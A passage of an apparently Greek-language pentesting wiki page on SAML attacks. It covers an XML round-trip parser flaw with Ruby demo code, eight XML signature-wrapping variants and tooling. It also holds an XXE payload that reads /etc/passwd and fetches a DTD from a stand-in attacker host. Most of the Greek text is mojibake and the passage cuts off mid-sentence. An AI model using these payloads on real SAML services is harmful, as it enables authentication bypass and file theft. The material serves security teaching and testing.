# SAML Attacks

## SAML Attacks

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## Tool

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): ÎˆÎ½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î¬ÏÎµÎ¹ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL Î® Î»Î¯ÏƒÏ„Î± Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ URL ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„Ï…Ï€ÏÏƒÎµÎ¹ Ï€Î¯ÏƒÏ‰ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL ÎºÎ±Ï„Î±Î½Î¬Î»Ï‰ÏƒÎ·Ï‚ SAML.

## XML round-trip

Î£Ï„Î¿ XML, Ï„Î¿ Ï…Ï€Î¿Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½Î¿ Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… XML Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÏƒÏ„Î· Î¼Î½Î®Î¼Î·, ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÎºÎ¬Ï€Î¿Î¹Î± ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·/Î±Ï€Î¿ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÎ±Î¹ ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î· Ï…Ï€Î¿Î³ÏÎ±Ï†Î®. Î™Î´Î±Î½Î¹ÎºÎ¬, Î±Ï…Ï„Î® Î· ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·/Î±Ï€Î¿ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î´ÎµÎ½ Î¸Î± Î­Ï€ÏÎµÏ€Îµ Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±, Î±Î»Î»Î¬ Î¼Îµ Î²Î¬ÏƒÎ· Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿, **Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Î¹ ÎºÎ±Î¹ Ï„Î± Î±ÏÏ‡Î¹ÎºÎ¬ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ ÎµÎ¯Î½Î±Î¹ Ï„Î± Î¯Î´Î¹Î±**.

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÏÎ´Î¹ÎºÎ±:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
Î— ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ ÎºÎ±Ï„Î¬ Ï„Î¿Ï… REXML 3.2.4 Î® Ï€Î±Î»Î±Î¹ÏŒÏ„ÎµÏÎ·Ï‚ Î­ÎºÎ´Î¿ÏƒÎ·Ï‚ Î¸Î± ÎµÎ¯Ï‡Îµ Ï‰Ï‚ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î·Î½ ÎµÎ¾Î®Ï‚ Î­Î¾Î¿Î´Î¿ Î±Î½Ï„Î¯ Î³Î¹Î± Î±Ï…Ï„Î®Î½:
```
First child in original doc: Y
First child after round-trip: Z
```
This is how REXML saw the original XML document from the program above:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (1001).png>)

And this is how it saw it after a round of parsing and serialization:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (445).png>)

For more information about the vulnerability and how to abuse it:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Signature Wrapping Attacks

In **XML Signature Wrapping attacks (XSW)**, Î¿Î¹ Î±Î½Ï„Î¯Ï€Î±Î»Î¿Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎ¿Î½Ï„Î±Î¹ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï€Î¿Ï… Ï€ÏÎ¿ÎºÏÏ€Ï„ÎµÎ¹ ÏŒÏ„Î±Î½ Ï„Î± XML Î­Î³Î³ÏÎ±Ï†Î± ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶Î¿Î½Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ Î´ÏÎ¿ Î´Î¹Î±ÎºÏÎ¹Ï„ÏÎ½ Ï†Î¬ÏƒÎµÏ‰Î½: **ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ· Ï…Ï€Î¿Î³ÏÎ±Ï†Î®Ï‚** ÎºÎ±Î¹ **ÎºÎ»Î®ÏƒÎ· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚**. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î·Ï‚ Î´Î¿Î¼Î®Ï‚ Ï„Î¿Ï… XML ÎµÎ³Î³ÏÎ¬Ï†Î¿Ï…. Î£Ï…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î±, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ **ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Ï€Î»Î±ÏƒÏ„Î¬ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î±** Ï€Î¿Ï… Î´ÎµÎ½ Î¸Î­Ï„Î¿Ï…Î½ ÏƒÎµ ÎºÎ¯Î½Î´Ï…Î½Î¿ Ï„Î·Î½ ÎµÎ³ÎºÏ…ÏÏŒÏ„Î·Ï„Î± Ï„Î·Ï‚ XML Ï…Ï€Î¿Î³ÏÎ±Ï†Î®Ï‚. Î‘Ï…Ï„Î® Î· Ï‡ÎµÎ¹ÏÎ±Î³ÏÎ³Î·ÏƒÎ· ÏƒÏ„Î¿Ï‡ÎµÏÎµÎ¹ ÏƒÏ„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î¼Î¹Î±Ï‚ Î´Î¹Î±Ï†Î¿ÏÎ¬Ï‚ Î¼ÎµÏ„Î±Î¾Ï Ï„Ï‰Î½ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Ï‰Î½ Ï€Î¿Ï… Î±Î½Î±Î»ÏÎ¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î· **Î»Î¿Î³Î¹ÎºÎ® ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚** ÎºÎ±Î¹ ÎµÎºÎµÎ¯Î½Ï‰Î½ Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ **module ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ·Ï‚ Ï…Ï€Î¿Î³ÏÎ±Ï†Î®Ï‚**. Î©Ï‚ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î±, ÎµÎ½Ï Î· XML Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Ï€Î±ÏÎ±Î¼Î­Î½ÎµÎ¹ Ï„ÎµÏ‡Î½Î¹ÎºÎ¬ Î­Î³ÎºÏ…ÏÎ· ÎºÎ±Î¹ Ï€ÎµÏÎ½Î¬ Ï„Î·Î½ ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ·, Î· Î»Î¿Î³Î¹ÎºÎ® ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î± **Ï€Î±ÏÎ¬Î½Î¿Î¼Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î±**. ÎšÎ±Ï„Î¬ ÏƒÏ…Î½Î­Ï€ÎµÎ¹Î±, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ¬ Ï„Î·Î½ **Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± Î±ÎºÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î±Ï‚** ÎºÎ±Î¹ **Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÏŒÏ„Î·Ï„Î±Ï‚ Ï€ÏÎ¿Î­Î»ÎµÏ…ÏƒÎ·Ï‚** Ï„Î·Ï‚ XML Ï…Ï€Î¿Î³ÏÎ±Ï†Î®Ï‚, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ **ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿Ï… Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï…** Ï‡Ï‰ÏÎ¯Ï‚ Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·.

ÎŸÎ¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Î²Î±ÏƒÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ [**Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ· ÏƒÏ„Î¿ blog**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **ÎºÎ±Î¹** [**Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏÎ³Î±ÏƒÎ¯Î±**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf). ÎˆÏ„ÏƒÎ¹, ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„Î­Ï‚ Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚.

### XSW #1

* **Strategy**: ÎˆÎ½Î± Î½Î­Î¿ ÏÎ¹Î¶Î¹ÎºÏŒ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î·Î½ Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Ï€ÏÎ¿ÏƒÏ„Î¯Î¸ÎµÏ„Î±Î¹.
* **Implication**: ÎŸ ÎµÏ€Î¹ÎºÏ…ÏÏ‰Ï„Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Ï€ÎµÏÎ´ÎµÏ…Ï„ÎµÎ¯ Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… Î½ÏŒÎ¼Î¹Î¼Î¿Ï… "Response -> Assertion -> Subject" ÎºÎ±Î¹ Ï„Î¿Ï… "ÎºÎ±ÎºÎ¿Ï Î½Î­Î¿Ï… Response -> Assertion -> Subject" Ï„Î¿Ï… ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…, Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ Î¶Î·Ï„Î®Î¼Î±Ï„Î± Î±ÎºÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î±Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (506).png>)

### XSW #2

* **Difference from XSW #1**: Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼Î¹Î± Î±Ï€Î¿ÏƒÏ€Î±ÏƒÎ¼Î­Î½Î· Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Î±Î½Ï„Î¯ Î³Î¹Î± Î¼Î¹Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Ï…ÏƒÎ± Ï…Ï€Î¿Î³ÏÎ±Ï†Î®.
* **Implication**: Î— "ÎºÎ±ÎºÎ®" Î´Î¿Î¼Î®, Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î·Î½ XSW #1, ÏƒÏ„Î¿Ï‡ÎµÏÎµÎ¹ Î½Î± Ï€Î±ÏÎ±Ï€Î»Î±Î½Î®ÏƒÎµÎ¹ Ï„Î· Î»Î¿Î³Î¹ÎºÎ® ÎµÏ€Î¹Ï‡ÎµÎ¯ÏÎ·ÏƒÎ·Ï‚ Î¼ÎµÏ„Î¬ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Î±ÎºÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î±Ï‚.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (466).png>)

### XSW #3

* **Strategy**: Î”Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± ÎºÎ±ÎºÎ® Assertion ÏƒÏ„Î¿ Î¯Î´Î¹Î¿ Î¹ÎµÏÎ±ÏÏ‡Î¹ÎºÏŒ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ Î¼Îµ Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® assertion.
* **Implication**: Î£ÎºÎ¿Ï€ÎµÏÎµÎ¹ Î½Î± Î¼Ï€ÎµÏÎ´Î­ÏˆÎµÎ¹ Ï„Î· Î»Î¿Î³Î¹ÎºÎ® ÎµÏ€Î¹Ï‡ÎµÎ¯ÏÎ·ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (120).png>)

### XSW #4

* **Difference from XSW #3**: Î— Î±ÏÏ‡Î¹ÎºÎ® Assertion Î³Î¯Î½ÎµÏ„Î±Î¹ Ï€Î±Î¹Î´Î¯ Ï„Î·Ï‚ Î´Î¹Ï€Î»Î±ÏƒÎ¹Î±ÏƒÎ¼Î­Î½Î·Ï‚ (ÎºÎ±ÎºÎ®Ï‚) Assertion.
* **Implication**: Î Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î·Î½ XSW #3 Î±Î»Î»Î¬ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î· Î´Î¿Î¼Î® XML Ï€Î¹Î¿ ÎµÏ€Î¹Î¸ÎµÏ„Î¹ÎºÎ¬.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (551).png>)

### XSW #5

* **Unique Aspect**: ÎŸÏÏ„Îµ Î· Î¥Ï€Î¿Î³ÏÎ±Ï†Î® Î¿ÏÏ„Îµ Î· Î±ÏÏ‡Î¹ÎºÎ® Assertion ÏƒÏ…Î¼Î¼Î¿ÏÏ†ÏÎ½Î¿Î½Ï„Î±Î¹ Î¼Îµ Ï„Î¹Ï‚ Ï„Ï…Ï€Î¹ÎºÎ­Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ (Ï€ÎµÏÎ¹Î²Î±Î»Î»ÏŒÎ¼ÎµÎ½Î·/Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Ï…ÏƒÎ±/Î±Ï€Î¿ÏƒÏ€Î±ÏƒÎ¼Î­Î½Î·).
* **Implication**: Î— Î±Î½Ï„Î¹Î³ÏÎ±Î¼Î¼Î­Î½Î· Assertion Ï€ÎµÏÎ¹Î²Î¬Î»Î»ÎµÎ¹ Ï„Î·Î½ Î¥Ï€Î¿Î³ÏÎ±Ï†Î®, Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· Î´Î¿Î¼Î® Ï„Î¿Ï… Î±Î½Î±Î¼ÎµÎ½ÏŒÎ¼ÎµÎ½Î¿Ï… ÎµÎ³Î³ÏÎ¬Ï†Î¿Ï….

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (1030).png>)

### XSW #6

* **Strategy**: Î Î±ÏÏŒÎ¼Î¿Î¹Î± ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î±Ï‚ ÏŒÏ€Ï‰Ï‚ Î· XSW #4 ÎºÎ±Î¹ #5, Î±Î»Î»Î¬ Î¼Îµ Î¼Î¹Î± Î±Î½Î±Ï„ÏÎ¿Ï€Î®.
* **Implication**: Î— Î±Î½Ï„Î¹Î³ÏÎ±Î¼Î¼Î­Î½Î· Assertion Ï€ÎµÏÎ¹Î²Î¬Î»Î»ÎµÎ¹ Ï„Î·Î½ Î¥Ï€Î¿Î³ÏÎ±Ï†Î®, Î· Î¿Ï€Î¿Î¯Î± ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»ÎµÎ¹ Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Assertion, Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± Ï†Ï‰Î»Î¹Î±ÏƒÎ¼Î­Î½Î· Ï€Î±ÏÎ±Ï€Î»Î±Î½Î·Ï„Î¹ÎºÎ® Î´Î¿Î¼Î®.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (169).png>)

### XSW #7

* **Strategy**: ÎˆÎ½Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿ Extensions ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î·Î½ Î±Î½Ï„Î¹Î³ÏÎ±Î¼Î¼Î­Î½Î· Assertion Ï‰Ï‚ Ï€Î±Î¹Î´Î¯.
* **Implication**: Î‘Ï…Ï„ÏŒ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î¿ Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÏƒÏ‡Î®Î¼Î± Ï„Î¿Ï… ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿Ï… Extensions Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ Ï„Î± Î¼Î­Ï„ÏÎ± ÎºÎ±Ï„Î¬ Ï„Î·Ï‚ ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·Ï‚ ÏƒÏ‡Î®Î¼Î±Ï„Î¿Ï‚, ÎµÎ¹Î´Î¹ÎºÎ¬ ÏƒÎµ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ OpenSAML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (971).png>)

### XSW #8

* **Difference from XSW #7**: Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î± Î¬Î»Î»Î¿ Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ XML ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿ Î³Î¹Î± Î¼Î¹Î± Ï€Î±ÏÎ±Î»Î»Î±Î³Î® Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚.
* **Implication**: Î— Î±ÏÏ‡Î¹ÎºÎ® Assertion Î³Î¯Î½ÎµÏ„Î±Î¹ Ï€Î±Î¹Î´Î¯ Ï„Î¿Ï… Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÏ„Î¹ÎºÎ¿Ï ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿Ï…, Î±Î½Î±ÏƒÏ„ÏÎ­Ï†Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Î¿Î¼Î® Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ ÏƒÏ„Î·Î½ XSW #7.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (541).png>)

### Tool

You can use the Burp extension [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) to parse the request, apply any XSW attack you choose, and launch it.

## XXE

If you don't know which kind of attacks are XXE, please read the following page:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML Responses are **deflated and base64 encoded XML documents** and can be susceptible to XML External Entity (XXE) attacks. By manipulating the XML structure of the SAML Response, attackers can attempt to exploit XXE vulnerabilities. Hereâ€™s how such an attack can be visualized:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Tools

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Ï„Î¿ POC Î±Ï€ÏŒ Î­Î½Î± SAML request Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î³Î¹Î± Ï€Î¹Î¸Î±Î½Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ XXE ÎºÎ±Î¹ SAML.

Î•Î»Î­Î³Î¾Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ Î¿Î¼Î¹Î»Î¯Î±: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ XSLT, ÎµÏ€Î¹ÏƒÎºÎµÏ†Î¸ÎµÎ¯Ï„Îµ:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

ÎŸÎ¹ Î•Ï€ÎµÎºÏ„Î¬ÏƒÎ¹Î¼ÎµÏ‚ ÎœÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Î¯ Î“Î»ÏÏƒÏƒÎ±Ï‚ Î£Ï„Ï…Î» (XSLT) Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Ï„Î· Î¼ÎµÏ„Î±Ï„ÏÎ¿Ï€Î® XML ÎµÎ³Î³ÏÎ¬Ï†Ï‰Î½ ÏƒÎµ Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ Î¼Î¿ÏÏ†Î­Ï‚ ÏŒÏ€Ï‰Ï‚ HTML, JSON Î® PDF. Î•Î¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ Î½Î± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯ ÏŒÏ„Î¹ **Î¿Î¹ Î¼ÎµÏ„Î±ÏƒÏ‡Î·Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Î¯ XSLT ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ· Ï„Î·Ï‚ ÏˆÎ·Ï†Î¹Î±ÎºÎ®Ï‚ Ï…Ï€Î¿Î³ÏÎ±Ï†Î®Ï‚**. Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ 